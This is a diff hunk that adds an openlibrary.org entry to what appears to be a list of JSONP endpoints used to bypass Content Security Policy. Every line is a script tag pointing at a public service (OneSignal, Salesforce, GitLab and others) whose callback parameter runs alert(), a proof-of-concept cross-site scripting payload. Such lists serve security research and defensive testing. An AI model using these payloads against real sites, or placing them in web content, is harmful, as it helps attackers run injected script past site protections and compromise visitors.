@@ -209,6 +209,7 @@ okt.to	<script src="https://okt.to/ping?callback=window.alert(window.origin)"></
 omtr2.partners.salesforce.com	<script src="https://omtr2.partners.salesforce.com/id?callback=alert"></script>
 onesignal.com	<script src="https://onesignal.com/api/v1/sync/0a5d329d-664d-4253-9bdd-62f208e2ae79/web?callback=alert(1)-"></script>
 openexchangerates.org	<script src="https://openexchangerates.org/api/latest.json?app_id=4a363014b909486b8f49d967b810a6c3&callback=alert(document.domain)"></script>
+openlibrary.org	<script src="https://openlibrary.org/books/OL7353617M.json?callback=alert"></script>
 openx.com	<script src="https://openx.com/wp-json?_jsonp=window.alert"></script>
 p.cquotient.com	<script src="https://p.cquotient.com/pebble?tla=bbrk-HemaNL&callback=window.alert"></script>
 page.gitlab.com	<script src="https://page.gitlab.com/index.php/form/getForm?munchkinId=194-VVC-221&form=1077&callback=alert"></script>
